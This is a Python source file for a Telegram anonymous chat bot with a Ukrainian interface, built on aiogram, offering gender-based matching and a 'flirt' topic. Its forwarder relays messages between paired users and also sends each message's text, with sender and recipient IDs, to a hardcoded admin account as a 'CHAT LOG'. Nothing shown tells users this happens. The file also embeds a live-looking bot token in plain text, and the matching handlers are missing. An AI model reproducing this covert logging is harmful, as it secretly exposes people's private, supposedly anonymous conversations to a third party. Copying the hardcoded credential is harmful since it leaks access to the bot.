import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from aiohttp import web

BOT_TOKEN = "8724564645:AAFk2Im7H2_WpY9G9EiRZbnIz1fRuwa_4J4"

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# 👑 ADMIN ID
ADMIN_ID = 342371504

async def admin_log(text: str):
    try:
        await bot.send_message(ADMIN_ID, text)
    except Exception as e:
        logging.error(f"Admin log error: {e}")

# =====================================================
# USERS DATABASE
# =====================================================
users_db = {}

# =====================================================
# KEYBOARDS
# =====================================================

def get_gender_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="👨 Я Хлопець"))
    builder.add(types.KeyboardButton(text="👩 Я Дівчина"))
    builder.adjust(2)
    return builder.as_markup(resize_keyboard=True)

def get_main_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="🔍 Знайти співрозмовника"))
    builder.add(types.KeyboardButton(text="📊 Онлайн"))
    builder.add(types.KeyboardButton(text="ℹ️ Правила"))
    builder.adjust(1)
    return builder.as_markup(resize_keyboard=True)

def get_search_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="🙋‍♂️ Шукаю Хлопця"))
    builder.add(types.KeyboardButton(text="🙋‍♀️ Шукаю Дівчину"))
    builder.add(types.KeyboardButton(text="🌍 Шукаю Будь-кого"))
    builder.add(types.KeyboardButton(text="⬅️ Назад"))
    builder.adjust(2, 1, 1)
    return builder.as_markup(resize_keyboard=True)

def get_topic_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="💬 Звичайне спілкування"))
    builder.add(types.KeyboardButton(text="❤️ Флірт"))
    builder.adjust(1)
    return builder.as_markup(resize_keyboard=True)

def get_chat_menu():
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="⏭ Next"))
    builder.add(types.KeyboardButton(text="🛑 Зупинити чат"))
    builder.add(types.KeyboardButton(text="👀 Хто друкує?"))
    builder.adjust(2, 1)
    return builder.as_markup(resize_keyboard=True)

# =====================================================
# START
# =====================================================

@dp.message(Command("start"))
async def start(message: types.Message):

    user_id = message.from_user.id

    users_db[user_id] = {
        "status": "gender_select",
        "gender": None,
        "search_preference": "any",
        "topic": "normal",
        "partner": None
    }

    await message.answer(
        "✨ Ласкаво просимо в РОЗМОВА ✨\nОбери стать 👇",
        reply_markup=get_gender_menu()
    )

# =====================================================
# FORWARDER + ADMIN LOG
# =====================================================

@dp.message()
async def forwarder(message: types.Message):

    user_id = message.from_user.id

    if user_id not in users_db:
        return

    user = users_db[user_id]

    if user["status"] != "chat":
        return

    partner_id = user["partner"]

    if not partner_id:
        return

    try:

        await bot.send_chat_action(partner_id, "typing")

        text = message.text or "📎 media"

        if message.text:
            await bot.send_message(partner_id, message.text)

        elif message.photo:
            await bot.send_photo(partner_id, message.photo[-1].file_id)

        elif message.video:
            await bot.send_video(partner_id, message.video.file_id)

        elif message.voice:
            await bot.send_voice(partner_id, message.voice.file_id)

        elif message.sticker:
            await bot.send_sticker(partner_id, message.sticker.file_id)

        elif message.animation:
            await bot.send_animation(partner_id, message.animation.file_id)

        # 🔥 ADMIN LOG
        await admin_log(
            f"💬 CHAT LOG\n"
            f"👤 From: {user_id}\n"
            f"➡️ To: {partner_id}\n"
            f"🧾: {text}"
        )

    except Exception as e:
        logging.error(e)

# =====================================================
# SIMPLE WEB SERVER
# =====================================================

async def handle(request):
    return web.Response(text="BOT ONLINE")

async def start_bg(app):
    asyncio.create_task(dp.start_polling(bot))

async def main():

    await bot.delete_webhook(drop_pending_updates=True)

    app = web.Application()
    app.router.add_get("/", handle)
    app.on_startup.append(start_bg)

    port = int(os.getenv("PORT", 10000))

    runner = web.AppRunner(app)
    await runner.setup()

    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

    print("BOT STARTED")

    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
